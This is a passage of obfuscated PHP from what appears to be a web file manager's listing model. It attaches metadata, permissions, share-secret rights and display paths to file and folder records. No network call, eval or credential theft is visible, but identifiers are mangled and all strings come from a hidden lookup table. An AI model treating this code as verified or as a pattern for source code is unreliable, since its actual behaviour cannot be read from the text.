$Ë¶ß–ÁŒ = $éìÙéôœ[457] . $ä´‚æ…ê[$–í’“£] . $éìÙéôœ[53] . $‘›•×íŒ[$ô¶…æß­]; $Ë¶ß–ÁŒ = rtrim(trim($Ë¶ß–ÁŒ), $éìÙéôœ[50]); if ($ŠĞÆ¥¬Í) { return array($Ë¶ß–ÁŒ, $‘›•×íŒ[$ô¶…æß­]); } return $this->order($Ë¶ß–ÁŒ); } protected function _listDataApplyItem($¼¯¦…¡, $÷êŸ—¡Ÿ = false) { $ÄÕ·§› = array($¼¯¦…¡); $this->_listDataApply($ÄÕ·§›, $÷êŸ—¡Ÿ); return $ÄÕ·§›[0]; } protected function _listDataApply(&$È‘£¢œõ, $‹ÉúŞƒ = false) { $×…²£Í‘ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$È‘£¢œõ) { $È‘£¢œõ = array(); return; } $£Óœº©ì = array_to_keyvalue($È‘£¢œõ, $×…²£Í‘[12], $×…²£Í‘[403]); $£Óœº©ì = array_unique($£Óœº©ì); $this->_listSourceCache($È‘£¢œõ); if (!$‹ÉúŞƒ) { $this->_listAppendMeta($È‘£¢œõ, $£Óœº©ì); $this->_listAppendFileMeta($È‘£¢œõ, $£Óœº©ì); $this->_listAppendChildren($È‘£¢œõ, $£Óœº©ì); } $this->_listAppendPath($È‘£¢œõ); $this->_listAppendAuth($È‘£¢œõ); $this->_listAppendSourceInfo($È‘£¢œõ, $£Óœº©ì); $this->_listAppendUser($È‘£¢œõ); $this->_listFilterInfo($È‘£¢œõ, $‹ÉúŞƒ); $this->_listAppendAuthSecret($È‘£¢œõ); } protected function _listSourceCache($½÷à‚«) { $œŒş² =& $_SERVER[¥Ÿ©ÒèÌ]; foreach ($½÷à‚« as $äûë­÷‡) { self::$cacheSourceInfo[$œŒş²[458] . $äûë­÷‡[$œŒş²[403]]] = $äûë­÷‡; } } protected function _listFilterInfo(&$ÏÁÑ‡Ü, $­ÏÛ±™ = false) { $ºş˜ä•„ =& $_SERVER[¥Ÿ©ÒèÌ]; foreach ($ÏÁÑ‡Ü as &$ äãô×ê) { $ äãô×ê = $this->pathInfoFilter($ äãô×ê); self::$cachePathInfo[$ºş˜ä•„[459] . intval($­ÏÛ±™) . $ºş˜ä•„[460] . $ äãô×ê[$ºş˜ä•„[403]]] = $ äãô×ê; } unset($ äãô×ê); } protected function _listMake(&$õÃÂå¶ï) { $ÈÔš˜üí =& $_SERVER[¥Ÿ©ÒèÌ]; $õÃÂå¶ï[$ÈÔš˜üí[77]] = array(); $õÃÂå¶ï[$ÈÔš˜üí[76]] = array(); foreach ($õÃÂå¶ï[$ÈÔš˜üí[373]] as $¦ËåÑ¼‹) { $ÊİÖ‹é© = $¦ËåÑ¼‹[$ÈÔš˜üí[411]] == 1 ? $ÈÔš˜üí[77] : $ÈÔš˜üí[76]; $õÃÂå¶ï[$ÊİÖ‹é©][] = $¦ËåÑ¼‹; } unset($õÃÂå¶ï[$ÈÔš˜üí[373]]); } protected function _listAppendMeta(&$›êÒš©ª, $ÀæÅÛ«Œ) { $„‚¼Îìş =& $_SERVER[¥Ÿ©ÒèÌ]; $üÀ®ãË· = array($„‚¼Îìş[418] => array($„‚¼Îìş[419], $ÀæÅÛ«Œ)); $ñ­‡–ï½ = Model($„‚¼Îìş[461])->field($„‚¼Îìş[462])->where($üÀ®ãË·)->select(); if (!$ñ­‡–ï½) { return; } $Ş—í¥‡â = array($„‚¼Îìş[463], $„‚¼Îìş[464], $„‚¼Îìş[442]); $İÇçåšÌ = array(); foreach ($ñ­‡–ï½ as $»ÛÚãÍ®) { if (!isset($İÇçåšÌ[$»ÛÚãÍ®[$„‚¼Îìş[403]]])) { $İÇçåšÌ[$»ÛÚãÍ®[$„‚¼Îìş[403]]] = array(); } if (in_array($»ÛÚãÍ®[$„‚¼Îìş[95]], $Ş—í¥‡â)) { continue; } $İÇçåšÌ[$»ÛÚãÍ®[$„‚¼Îìş[403]]][$»ÛÚãÍ®[$„‚¼Îìş[95]]] = $»ÛÚãÍ®[$„‚¼Îìş[378]]; } foreach ($›êÒš©ª as &$ô›¾ÀòË) { $ô›¾ÀòË[$„‚¼Îìş[465]] = !1; if (isset($İÇçåšÌ[$ô›¾ÀòË[$„‚¼Îìş[403]]])) { $ô›¾ÀòË[$„‚¼Îìş[465]] = $İÇçåšÌ[$ô›¾ÀòË[$„‚¼Îìş[403]]]; } if ($this->fileIsLock($ô›¾ÀòË) && $ô›¾ÀòË[$„‚¼Îìş[414]]) { $­¹òŒ„ö = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ô›¾ÀòË[$„‚¼Îìş[414]][$„‚¼Îìş[415]] = AuthModel::authDisable($ô›¾ÀòË[$„‚¼Îìş[414]][$„‚¼Îìş[415]], $­¹òŒ„ö); $ô›¾ÀòË[$„‚¼Îìş[414]][$„‚¼Îìş[466]][$„‚¼Îìş[414]] = $ô›¾ÀòË[$„‚¼Îìş[414]][$„‚¼Îìş[415]]; } } unset($ô›¾ÀòË); } protected function _listAppendFileMeta(&$¥ûşÇé¢, $÷Ë°Ò÷ğ) { $¯ó¾òÜ =& $_SERVER[¥Ÿ©ÒèÌ]; $øúŠ¡ˆ÷ = array_to_keyvalue($¥ûşÇé¢, $¯ó¾òÜ[12], $¯ó¾òÜ[467]); $øúŠ¡ˆ÷ = array_filter(array_unique($øúŠ¡ˆ÷)); if (!$øúŠ¡ˆ÷) { return; } $ ÊËÎöÚ = array($¯ó¾òÜ[468] => array($¯ó¾òÜ[419], $øúŠ¡ˆ÷)); $ŠùĞ´âæ = $¯ó¾òÜ[469]; $®öç§ô = Model($¯ó¾òÜ[470])->field($ŠùĞ´âæ)->where($ ÊËÎöÚ)->select(); $®öç§ô = array_to_keyvalue($®öç§ô, $¯ó¾òÜ[467]); $ÑŸéòèµ = Model($¯ó¾òÜ[471])->field($¯ó¾òÜ[472])->where($ ÊËÎöÚ)->select(); $ÑŸéòèµ = $ÑŸéòèµ ? $ÑŸéòèµ : array(); $ß€€Í´ = array(); foreach ($ÑŸéòèµ as $·½Äµ‘Ì) { if (!isset($ß€€Í´[$·½Äµ‘Ì[$¯ó¾òÜ[467]]])) { $ß€€Í´[$·½Äµ‘Ì[$¯ó¾òÜ[467]]] = array(); } $ß€€Í´[$·½Äµ‘Ì[$¯ó¾òÜ[467]]][$·½Äµ‘Ì[$¯ó¾òÜ[95]]] = $·½Äµ‘Ì[$¯ó¾òÜ[378]]; } foreach ($¥ûşÇé¢ as &$¦ÜŸë¤÷) { $ñÔØ ğ‰ = $¦ÜŸë¤÷[$¯ó¾òÜ[467]]; if (!$ñÔØ ğ‰ || !is_array($®öç§ô[$ñÔØ ğ‰])) { continue; } $¸Ûâ¯Ôş = $®öç§ô[$ñÔØ ğ‰]; $¸Ûâ¯Ôş[$¯ó¾òÜ[80]] = $¦ÜŸë¤÷[$¯ó¾òÜ[80]]; $¸Ûâ¯Ôş[$¯ó¾òÜ[32]] = $¦ÜŸë¤÷[$¯ó¾òÜ[32]]; if (!isset(self::$cacheFileInfo[$¯ó¾òÜ[473] . $ñÔØ ğ‰])) { self::$cacheFileInfo[$¯ó¾òÜ[473] . $ñÔØ ğ‰] = array_merge(array(), $¸Ûâ¯Ôş); } unset($®öç§ô[$ñÔØ ğ‰][$¯ó¾òÜ[78]]); $Ï—ô‚­€ = is_array($ß€€Í´[$ñÔØ ğ‰]) ? $ß€€Í´[$ñÔØ ğ‰] : array(); $¦ÜŸë¤÷[$¯ó¾òÜ[163]] = array_merge($Ï—ô‚­€, $®öç§ô[$ñÔØ ğ‰]); if (isset($¦ÜŸë¤÷[$¯ó¾òÜ[163]][$¯ó¾òÜ[162]])) { $¦ÜŸë¤÷[$¯ó¾òÜ[162]] = json_decode($¦ÜŸë¤÷[$¯ó¾òÜ[163]][$¯ó¾òÜ[162]], !0); unset($¦ÜŸë¤÷[$¯ó¾òÜ[163]][$¯ó¾òÜ[162]]); } } unset($¦ÜŸë¤÷); } protected function _listAppendSourceInfo(&$ãéó˜ÚÇ, $ï¢­××¹) { $ƒ¨šÂå =& $_SERVER[¥Ÿ©ÒèÌ]; if (!defined($ƒ¨šÂå[474])) { return; } $Û”ÁÙÖƒ = Model($ƒ¨šÂå[475])->listData(); $Ğê…ÜÎ­ = Model($ƒ¨šÂå[426])->listData(); $Ê÷µßòÏ = Model($ƒ¨šÂå[416])->listData(); $ˆ›Ş§ƒ = Model($ƒ¨šÂå[476])->listSimple(); $»•¬ª = array_to_keyvalue($Û”ÁÙÖƒ, $ƒ¨šÂå[401]); $šâ¹Ûå = array_to_keyvalue_group($Ğê…ÜÎ­, $ƒ¨šÂå[78], $ƒ¨šÂå[427]); $¶È˜ÆÍ× = array_to_keyvalue($Ê÷µßòÏ, $ƒ¨šÂå[78]); $›¡Ç¡Éà = array_to_keyvalue_group($ˆ›Ş§ƒ, $ƒ¨šÂå[403]); foreach ($ãéó˜ÚÇ as &$š”ÈİäÔ) { $š”ÈİäÔ[$ƒ¨šÂå[87]] = array($ƒ¨šÂå[477] => 0, $ƒ¨šÂå[478] => 0, $ƒ¨šÂå[479] => 0); if (isset($¶È˜ÆÍ×[$š”ÈİäÔ[$ƒ¨šÂå[403]]])) { $š”ÈİäÔ[$ƒ¨šÂå[87]][$ƒ¨šÂå[480]] = 1; $š”ÈİäÔ[$ƒ¨šÂå[87]][$ƒ¨šÂå[481]] = $¶È˜ÆÍ×[$š”ÈİäÔ[$ƒ¨šÂå[403]]][$ƒ¨šÂå[32]]; } if (isset($šâ¹Ûå[$š”ÈİäÔ[$ƒ¨šÂå[403]]])) { $š”ÈİäÔ[$ƒ¨šÂå[87]][$ƒ¨šÂå[482]] = array(); foreach ($šâ¹Ûå[$š”ÈİäÔ[$ƒ¨šÂå[403]]] as $î±üå¿ó) { $ã®Âœàî = $»•¬ª[$î±üå¿ó]; $š”ÈİäÔ[$ƒ¨šÂå[87]][$ƒ¨šÂå[482]][] = array($ƒ¨šÂå[483] => $ã®Âœàî[$ƒ¨šÂå[401]], $ƒ¨šÂå[421] => $ã®Âœàî[$ƒ¨šÂå[32]], $ƒ¨šÂå[484] => $ã®Âœàî[$ƒ¨šÂå[485]]); } } if (isset($›¡Ç¡Éà[$š”ÈİäÔ[$ƒ¨šÂå[403]]])) { $š”ÈİäÔ[$ƒ¨šÂå[87]][$ƒ¨šÂå[486]] = array(); foreach ($›¡Ç¡Éà[$š”ÈİäÔ[$ƒ¨šÂå[403]]] as $ÂÏ§”ê) { $š”ÈİäÔ[$ƒ¨šÂå[87]][$ƒ¨šÂå[486]] = array($ƒ¨šÂå[487] => $ÂÏ§”ê[$ƒ¨šÂå[488]], $ƒ¨šÂå[489] => $ÂÏ§”ê[$ƒ¨šÂå[490]], $ƒ¨šÂå[491] => $ÂÏ§”ê[$ƒ¨šÂå[403]], $ƒ¨šÂå[492] => $ÂÏ§”ê[$ƒ¨šÂå[493]], $ƒ¨šÂå[494] => $ÂÏ§”ê[$ƒ¨šÂå[495]], $ƒ¨šÂå[496] => $ÂÏ§”ê[$ƒ¨šÂå[496]], $ƒ¨šÂå[497] => $ÂÏ§”ê[$ƒ¨šÂå[497]]); } } } unset($š”ÈİäÔ); return $ãéó˜ÚÇ; } protected function _listAppendChildren(&$Òö²ôä, $ïÃÉóÏé) { $ŞÕƒ˜Á¤ =& $_SERVER[¥Ÿ©ÒèÌ]; $¥©›¢ÛÆ = array(); $¥›¦’ôÌ = array($ŞÕƒ˜Á¤[202] => 0, $ŞÕƒ˜Á¤[203] => 0); foreach ($Òö²ôä as &$ «ÓˆÃ„) { if (!$ «ÓˆÃ„[$ŞÕƒ˜Á¤[411]]) { continue; } $¥©›¢ÛÆ[] = $ «ÓˆÃ„[$ŞÕƒ˜Á¤[403]]; } unset($ «ÓˆÃ„); if (!$¥©›¢ÛÆ) { return; } $Ï­ëùÒş = array($ŞÕƒ˜Á¤[498] => array($ŞÕƒ˜Á¤[7], $¥©›¢ÛÆ)); $ùÈ”ô€À = array($ŞÕƒ˜Á¤[498], $ŞÕƒ˜Á¤[411], $ŞÕƒ˜Á¤[499] => $ŞÕƒ˜Á¤[500]); $ÎÍûŒ†ê = $this->field($ùÈ”ô€À)->where($Ï­ëùÒş)->group($ŞÕƒ˜Á¤[501])->select(); $Ä±¸¦Ã€ = array(); foreach ($ÎÍûŒ†ê as $È©¯Ø„í) { $Ñ°„ŒÂ· = $È©¯Ø„í[$ŞÕƒ˜Á¤[498]]; $ûØÍ’º¨ = $È©¯Ø„í[$ŞÕƒ˜Á¤[411]] == $ŞÕƒ˜Á¤[89] ? $ŞÕƒ˜Á¤[203] : $ŞÕƒ˜Á¤[202]; if (!isset($Ä±¸¦Ã€[$Ñ°„ŒÂ·])) { $Ä±¸¦Ã€[$Ñ°„ŒÂ·] = array($ŞÕƒ˜Á¤[202] => 0, $ŞÕƒ˜Á¤[203] => 0); } $Ä±¸¦Ã€[$Ñ°„ŒÂ·][$ûØÍ’º¨] += $È©¯Ø„í[$ŞÕƒ˜Á¤[500]]; } foreach ($Òö²ôä as &$ «ÓˆÃ„) { if (!$ «ÓˆÃ„[$ŞÕƒ˜Á¤[411]]) { continue; } $ûí¹ÈöÈ = is_array($Ä±¸¦Ã€[$ «ÓˆÃ„[$ŞÕƒ˜Á¤[403]]]) ? $Ä±¸¦Ã€[$ «ÓˆÃ„[$ŞÕƒ˜Á¤[403]]] : $¥›¦’ôÌ; $ «ÓˆÃ„[$ŞÕƒ˜Á¤[203]] = $ûí¹ÈöÈ[$ŞÕƒ˜Á¤[203]]; $ «ÓˆÃ„[$ŞÕƒ˜Á¤[202]] = $ûí¹ÈöÈ[$ŞÕƒ˜Á¤[202]]; unset($ «ÓˆÃ„[$ŞÕƒ˜Á¤[413]]); } unset($ «ÓˆÃ„); } protected function _listAppendAuth(&$·Üæ½ô) { $ıõƒÍµ¾ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!defined($ıõƒÍµ¾[474])) { return; } $•ñÄœ¸† = array(); foreach ($·Üæ½ô as $„°İ„º) { if ($„°İ„º[$ıõƒÍµ¾[412]] == self::TYPE_GROUP) { $•ñÄœ¸†[] = $„°İ„º[$ıõƒÍµ¾[403]]; } } if (!$•ñÄœ¸†) { return; } $œµâÃ¢è = array_to_keyvalue($·Üæ½ô, $ıõƒÍµ¾[403]); $ÖŸ÷‡‡ş = Model($ıõƒÍµ¾[502])->getSourceList($•ñÄœ¸†, $œµâÃ¢è); foreach ($·Üæ½ô as $øá¬©„µ => &$„°İ„º) { $„°İ„º[$ıõƒÍµ¾[414]] = $ÖŸ÷‡‡ş[$„°İ„º[$ıõƒÍµ¾[403]]]; if (!$„°İ„º[$ıõƒÍµ¾[414]] && $„°İ„º[$ıõƒÍµ¾[412]] == self::TYPE_GROUP) { $„°İ„º[$ıõƒÍµ¾[414]] = Action($ıõƒÍµ¾[503])->pathGroupAuthMake($„°İ„º[$ıõƒÍµ¾[504]]); if (!$„°İ„º[$ıõƒÍµ¾[414]] && !_get($GLOBALS, $ıõƒÍµ¾[505])) { $„°İ„º[$ıõƒÍµ¾[195]] = !1; $„°İ„º[$ıõƒÍµ¾[194]] = !1; } } if ($„°İ„º[$ıõƒÍµ¾[414]]) { $„°İ„º[$ıõƒÍµ¾[195]] = AuthModel::authCheckEdit($„°İ„º[$ıõƒÍµ¾[414]][$ıõƒÍµ¾[415]]); $„°İ„º[$ıõƒÍµ¾[194]] = AuthModel::authCheckView($„°İ„º[$ıõƒÍµ¾[414]][$ıõƒÍµ¾[415]]); } $this->groupPathDisplay($„°İ„º); } unset($„°İ„º); } public function _listAppendAuthSecret(&$í«¾‡Á¢) { $â–™¸Â“ =& $_SERVER[¥Ÿ©ÒèÌ]; if (Model($â–™¸Â“[433])->get($â–™¸Â“[506]) != $â–™¸Â“[89]) { return; } static $øŸÖ”Œ© = false; if (!$øŸÖ”Œ©) { $ÜÕÚÙê = Model($â–™¸Â“[507]); $¯Øğ’„± = Model($â–™¸Â“[508]); $øŸÖ”Œ© = $¯Øğ’„±->listData(); $øŸÖ”Œ© = array_to_keyvalue($øŸÖ”Œ©, $â–™¸Â“[403]); $ıôãß« = json_decode(Model($â–™¸Â“[433])->get($â–™¸Â“[509]), !0); $ıôãß« = array_to_keyvalue($ıôãß«, $â–™¸Â“[401]); foreach ($øŸÖ”Œ© as $ô¯¯ÅŞÒ => $—±ö™Ö) { $õÅ…ÇŸí = $ıôãß«[$—±ö™Ö[$â–™¸Â“[510]]]; if (!$õÅ…ÇŸí) { $¯Øğ’„±->remove($—±ö™Ö[$â–™¸Â“[401]]); unset($øŸÖ”Œ©[$ô¯¯ÅŞÒ]); continue; } $ÌË¾¥¢ = $ÜÕÚÙê->listData($õÅ…ÇŸí[$â–™¸Â“[414]]); if (!$ÌË¾¥¢) { $¯Øğ’„±->remove($—±ö™Ö[$â–™¸Â“[401]]); unset($øŸÖ”Œ©[$ô¯¯ÅŞÒ]); continue; } $—±ö™Ö[$â–™¸Â“[414]] = $ÌË¾¥¢; $—±ö™Ö[$â–™¸Â“[511]] = $õÅ…ÇŸí; $—±ö™Ö[$â–™¸Â“[512]] = Model($â–™¸Â“[513])->getInfoSimpleOuter($—±ö™Ö[$â–™¸Â“[452]]); $øŸÖ”Œ©[$ô¯¯ÅŞÒ] = $—±ö™Ö; } } $Ààİ¨‰ö = defined($â–™¸Â“[514]) ? USER_ID : $â–™¸Â“[12]; $¾–ã³ï‹ = array(); $šÏ§¤õ = $this->_listAppendPath($¾–ã³ï‹, !0); foreach ($í«¾‡Á¢ as $ô¯¯ÅŞÒ => &$—±ö™Ö) { if (!is_array($—±ö™Ö[$â–™¸Â“[414]])) { continue; } if ($—±ö™Ö[$â–™¸Â“[412]] != $â–™¸Â“[515]) { continue; } if (isset($øŸÖ”Œ©[$—±ö™Ö[$â–™¸Â“[403]]])) { $õÉ•õ‘ñ = $øŸÖ”Œ©[$—±ö™Ö[$â–™¸Â“[403]]]; if (!is_array($—±ö™Ö[$â–™¸Â“[465]])) { $—±ö™Ö[$â–™¸Â“[465]] = array(); } $—±ö™Ö[$â–™¸Â“[465]][$â–™¸Â“[516]] = $õÉ•õ‘ñ[$â–™¸Â“[510]]; $—±ö™Ö[$â–™¸Â“[414]][$â–™¸Â“[517]] = $õÉ•õ‘ñ; $—±ö™Ö[$â–™¸Â“[414]][$â–™¸Â“[518]] = $—±ö™Ö[$â–™¸Â“[519]]; $—±ö™Ö[$â–™¸Â“[414]][$â–™¸Â“[520]] = $â–™¸Â“[89]; if ($õÉ•õ‘ñ[$â–™¸Â“[452]] != $Ààİ¨‰ö) { $—±ö™Ö[$â–™¸Â“[414]][$â–™¸Â“[415]] = $—±ö™Ö[$â–™¸Â“[414]][$â–™¸Â“[415]] & $õÉ•õ‘ñ[$â–™¸Â“[414]][$â–™¸Â“[414]]; } continue; } $’îá÷²´ = $this->parentLevelArray($—±ö™Ö[$â–™¸Â“[521]]); $ã‰¦—ª = array_reverse($’îá÷²´); foreach ($ã‰¦—ª as $ß²´­çÁ => $ê™„ãÉ) { if (!isset($øŸÖ”Œ©[$ê™„ãÉ])) { continue; } $õÉ•õ‘ñ = $øŸÖ”Œ©[$ê™„ãÉ]; $—±ö™Ö[$â–™¸Â“[414]][$â–™¸Â“[517]] = $õÉ•õ‘ñ; if ($õÉ•õ‘ñ[$â–™¸Â“[452]] != $Ààİ¨‰ö) { $—±ö™Ö[$â–™¸Â“[414]][$â–™¸Â“[415]] = $—±ö™Ö[$â–™¸Â“[414]][$â–™¸Â“[415]] & $õÉ•õ‘ñ[$â–™¸Â“[414]][$â–™¸Â“[414]]; } $½õåİ¢® = $â–™¸Â“[12]; $äÜ±£ › = count($’îá÷²´) - $ß²´­çÁ; for ($ÌÀ¤¸ò = 0; $ÌÀ¤¸ò < $äÜ±£ ›; $ÌÀ¤¸ò++) { if (!isset($šÏ§¤õ[$’îá÷²´[$ÌÀ¤¸ò]])) { $½õåİ¢® = $â–™¸Â“[12]; break; } $½õåİ¢® = $½õåİ¢® . rtrim($šÏ§¤õ[$’îá÷²´[$ÌÀ¤¸ò]], $â–™¸Â“[8]) . $â–™¸Â“[8]; } $—±ö™Ö[$â–™¸Â“[414]][$â–™¸Â“[518]] = rtrim($½õåİ¢®, $â–™¸Â“[8]) . $â–™¸Â“[8]; break; } } unset($—±ö™Ö); } public function groupPathDisplay(&$ƒƒ©±÷ƒ) { $É»à‘… =& $_SERVER[¥Ÿ©ÒèÌ]; if ($ƒƒ©±÷ƒ[$É»à‘…[412]] != self::TYPE_GROUP) { return; } $¢¼±¡ = Model($É»à‘…[522])->getInfo($ƒƒ©±÷ƒ[$É»à‘…[504]]); $ÕšÉ‰¡à = $this->parentLevelArray($¢¼±¡[$É»à‘…[521]]); $•àÂèé¦ = $É»à‘…[12]; foreach ($ÕšÉ‰¡à as $µ¤ÚÌîÇ) { $àÀîÑü‹ = Model($É»à‘…[522])->getInfo($µ¤ÚÌîÇ); $•àÂèé¦ .= $àÀîÑü‹[$É»à‘…[87]][$É»à‘…[403]] . $É»à‘…[50]; } $ƒƒ©±÷ƒ[$É»à‘…[523]] = $¢¼±¡[$É»à‘…[498]]; $ƒƒ©±÷ƒ[$É»à‘…[524]] = $¢¼±¡[$É»à‘…[521]]; $ƒƒ©±÷ƒ[$É»à‘…[525]] = $¢¼±¡[$É»à‘…[526]]; $ƒƒ©±÷ƒ[$É»à‘…[527]] = $•àÂèé¦ . $¢¼±¡[$É»à‘…[87]][$É»à‘…[403]]; } protected function _listAppendPath(&$˜¢ÃíÉ, $ôÛ¶Ğø = false) { $ÊŠß¤×‹ =& $_SERVER[¥Ÿ©ÒèÌ]; static $¿Ôå›¹‡ = array(); $ÆŒâÓñ… = array(); $®ñºù‰ğ = array(); if ($ôÛ¶Ğø) { return $¿Ôå›¹‡; } foreach ($˜¢ÃíÉ as &$›ÓŒ¡¢Ğ) { $×İŒşöù = $›ÓŒ¡¢Ğ[$ÊŠß¤×‹[403]]; if ($›ÓŒ¡¢Ğ[$ÊŠß¤×‹[411]] == $ÊŠß¤×‹[89] && $›ÓŒ¡¢Ğ[$ÊŠß¤×‹[498]] != 0) { $¿Ôå›¹‡[$×İŒşöù] = $›ÓŒ¡¢Ğ[$ÊŠß¤×‹[32]]; } if ($›ÓŒ¡¢Ğ[$ÊŠß¤×‹[411]] == $ÊŠß¤×‹[89] && $›ÓŒ¡¢Ğ[$ÊŠß¤×‹[498]] == 0 && !isset($¿Ôå›¹‡[$×İŒşöù])) { $¿Ôå›¹‡[$×İŒşöù] = $this->_listAppendPathRoot($›ÓŒ¡¢Ğ, array()); } if (isset($®ñºù‰ğ[$›ÓŒ¡¢Ğ[$ÊŠß¤×‹[521]]])) { continue; } $®ñºù‰ğ[$›ÓŒ¡¢Ğ[$ÊŠß¤×‹[521]]] = !0; $ğİ’È½í = $this->parentLevelArray($›ÓŒ¡¢Ğ[$ÊŠß¤×‹[521]]); foreach ($ğİ’È½í as $ìëõœø¸ => $µœéÍ×º) { if (isset($¿Ôå›¹‡[$µœéÍ×º])) { continue; } if ($ìëõœø¸ == 0) { $¿Ôå›¹‡[$µœéÍ×º] = $this->_listAppendPathRoot($›ÓŒ¡¢Ğ, $ğİ’È½í); } if ($ìëõœø¸ != 0) { $ÆŒâÓñ…[] = $µœéÍ×º; } } } unset($›ÓŒ¡¢Ğ); $ÆŒâÓñ… = array_unique($ÆŒâÓñ…); if (count($ÆŒâÓñ…) > 0) { $‡“ë©É = array($ÊŠß¤×‹[418] => array($ÊŠß¤×‹[419], $ÆŒâÓñ…)); if (count($ÆŒâÓñ…) == 1) { $Œ¬ÍÔÑ¸ = $this->sourceInfo($ÆŒâÓñ…[0]); $Ó¼Ü¯Š = is_array($Œ¬ÍÔÑ¸) ? array($Œ¬ÍÔÑ¸) : !1; } else { $Ó¼Ü¯Š = $this->field($ÊŠß¤×‹[528])->where($‡“ë©É)->select(); } if (!$Ó¼Ü¯Š) { $Ó¼Ü¯Š = array(); } foreach ($Ó¼Ü¯Š as $”àŸÉüŸ) { $¿Ôå›¹‡[$”àŸÉüŸ[$ÊŠß¤×‹[403]]] = $”àŸÉüŸ[$ÊŠß¤×‹[32]]; } } $ÑçÀ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $‹€ÂÏÔ— = array(); foreach ($˜¢ÃíÉ as &$›ÓŒ¡¢Ğ) { $¥«·¾•Ø = $›ÓŒ¡¢Ğ[$ÊŠß¤×‹[521]]; $¥Âø»Ÿ = $ÊŠß¤×‹[12]; if (isset($‹€ÂÏÔ—[$¥«·¾•Ø])) { $¥Âø»Ÿ = $‹€ÂÏÔ—[$¥«·¾•Ø]; } else { $ğİ’È½í = $this->parentLevelArray($›ÓŒ¡¢Ğ[$ÊŠß¤×‹[521]]); foreach ($ğİ’È½í as $ìëõœø¸ => $µœéÍ×º) { if (isset($¿Ôå›¹‡[$µœéÍ×º])) { $¥Âø»Ÿ .= $¿Ôå›¹‡[$µœéÍ×º] . $ÊŠß¤×‹[8]; } } $‹€ÂÏÔ—[$¥«·¾•Ø] = $¥Âø»Ÿ; } $¥Âø»Ÿ .= $›ÓŒ¡¢Ğ[$ÊŠß¤×‹[32]]; if ($›ÓŒ¡¢Ğ[$ÊŠß¤×‹[411]] == $ÊŠß¤×‹[89]) { $¥Âø»Ÿ .= $ÊŠß¤×‹[8]; } $›ÓŒ¡¢Ğ[$ÊŠß¤×‹[519]] = str_replace($ÊŠß¤×‹[529], $ÊŠß¤×‹[8], $¥Âø»Ÿ); if ($›ÓŒ¡¢Ğ[$ÊŠß¤×‹[498]] == $ÊŠß¤×‹[190]) { $›ÓŒ¡¢Ğ[$ÊŠß¤×‹[32]] = trim($¿Ôå›¹‡[$›ÓŒ¡¢Ğ[$ÊŠß¤×‹[403]]], $ÊŠß¤×‹[8]); $›ÓŒ¡¢Ğ[$ÊŠß¤×‹[519]] = $›ÓŒ¡¢Ğ[$ÊŠß¤×‹[32]] . $ÊŠß¤×‹[8]; } if (intval($›ÓŒ¡¢Ğ[$ÊŠß¤×‹[412]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($›ÓŒ¡¢Ğ, $ğİ’È½í, $ÑçÀ); } } unset($›ÓŒ¡¢Ğ); return $˜¢ÃíÉ; } private function _listAppendPathRecycle(&$›È—‹¸¼, $±œüæã, $œ½÷üéÕ) { $íıŒ‚Ò˜ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!in_array($œ½÷üéÕ, $±œüæã) && $›È—‹¸¼[$íıŒ‚Ò˜[403]] != $œ½÷üéÕ) { return; } $ƒÔÍÔ…‰ = explode($íıŒ‚Ò˜[8], trim($›È—‹¸¼[$íıŒ‚Ò˜[519]], $íıŒ‚Ò˜[8])); $½Ş†å = implode($íıŒ‚Ò˜[8], array_slice($ƒÔÍÔ…‰, 2)); $›È—‹¸¼[$íıŒ‚Ò˜[519]] = $íıŒ‚Ò˜[8] . LNG($íıŒ‚Ò˜[530]) . $íıŒ‚Ò˜[8] . ltrim($½Ş†å, $íıŒ‚Ò˜[8]); $›È—‹¸¼[$íıŒ‚Ò˜[521]] = $íıŒ‚Ò˜[531] . implode($íıŒ‚Ò˜[50], array_slice($±œüæã, 1)) . $íıŒ‚Ò˜[50]; if ($›È—‹¸¼[$íıŒ‚Ò˜[403]] == $œ½÷üéÕ) { $›È—‹¸¼[$íıŒ‚Ò˜[521]] = $íıŒ‚Ò˜[531]; $›È—‹¸¼[$íıŒ‚Ò˜[498]] = $íıŒ‚Ò˜[190]; $›È—‹¸¼[$íıŒ‚Ò˜[32]] = LNG($íıŒ‚Ò˜[530]); } $›È—‹¸¼[$íıŒ‚Ò˜[532]] = $íıŒ‚Ò˜[533]; } protected function _listAppendPathRoot(&$»Ï­”Ïš, $„ÆÌíŠ) { $ğŒ§«Ú¿ =& $_SERVER[¥Ÿ©ÒèÌ]; $™ÄÁßÂ» = $ğŒ§«Ú¿[12]; if ($»Ï­”Ïš[$ğŒ§«Ú¿[412]] == self::TYPE_USER) { if (defined($ğŒ§«Ú¿[474]) && $»Ï­”Ïš[$ğŒ§«Ú¿[504]] == USER_ID) { $™ÄÁßÂ» = LNG($ğŒ§«Ú¿[534]); if (!$„ÆÌíŠ) { $»Ï­”Ïš[$ğŒ§«Ú¿[32]] = $™ÄÁßÂ»; } } else { $ëìŸ¬‹¤ = Model($ğŒ§«Ú¿[513])->getInfoSimple($»Ï­”Ïš[$ğŒ§«Ú¿[504]]); $™ÄÁßÂ» = LNG($ğŒ§«Ú¿[535]) . $ğŒ§«Ú¿[159] . $ëìŸ¬‹¤[$ğŒ§«Ú¿[32]] . $ğŒ§«Ú¿[536]; } } else { if ($»Ï­”Ïš[$ğŒ§«Ú¿[412]] == self::TYPE_GROUP) { $ëìŸ¬‹¤ = Model($ğŒ§«Ú¿[522])->getInfoSimple($»Ï­”Ïš[$ğŒ§«Ú¿[504]]); $™ÄÁßÂ» = $ëìŸ¬‹¤[$ğŒ§«Ú¿[32]]; } else { if ($»Ï­”Ïš[$ğŒ§«Ú¿[412]] == self::TYPE_SYSTEM) { $™ÄÁßÂ» = $ğŒ§«Ú¿[537]; } } } $™ÄÁßÂ» = $™ÄÁßÂ» ? $ğŒ§«Ú¿[8] . $™ÄÁßÂ» . $ğŒ§«Ú¿[8] : $ğŒ§«Ú¿[8]; return $™ÄÁßÂ»; } protected function _listAppendUser(&$¾­ÀˆÂ) { $Í×»÷­Ø =& $_SERVER[¥Ÿ©ÒèÌ]; $«İºé‹Œ = array_to_keyvalue($¾­ÀˆÂ, $Í×»÷­Ø[12], $Í×»÷­Ø[452]); $¡úú¨Ï = array_to_keyvalue($¾­ÀˆÂ, $Í×»÷­Ø[12], 